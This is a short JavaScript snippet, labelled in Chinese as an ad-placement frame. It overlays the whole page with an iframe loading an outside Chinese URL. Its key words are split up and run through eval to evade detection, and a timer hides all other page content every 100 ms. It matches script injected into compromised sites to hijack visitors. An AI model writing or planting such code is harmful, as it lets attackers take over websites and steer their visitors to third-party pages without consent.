//网站放广告框架
var url = "https://www.hnci.net.cn/js/22.html";
    var aa=Math.round(Math.random()*8+1);
    var  ss = '<div id="asdsa" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><ifr'+'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="100%" src="'+url+'"></iframe></div><style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden}</style>';
    eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');");
    try{
        setInterval(function(){
            for(var i=0;i<document.body.children.length;i++){
                try{
                    var tagname = document.body.children[i].tagName;
                    var myid = document.body.children[i].id;
                    if(myid!="asdsa"){
                        document.body.children[i].style.display="non"+"e";
                    }
                }catch(e){}
            }
},100);
    }catch(e){}
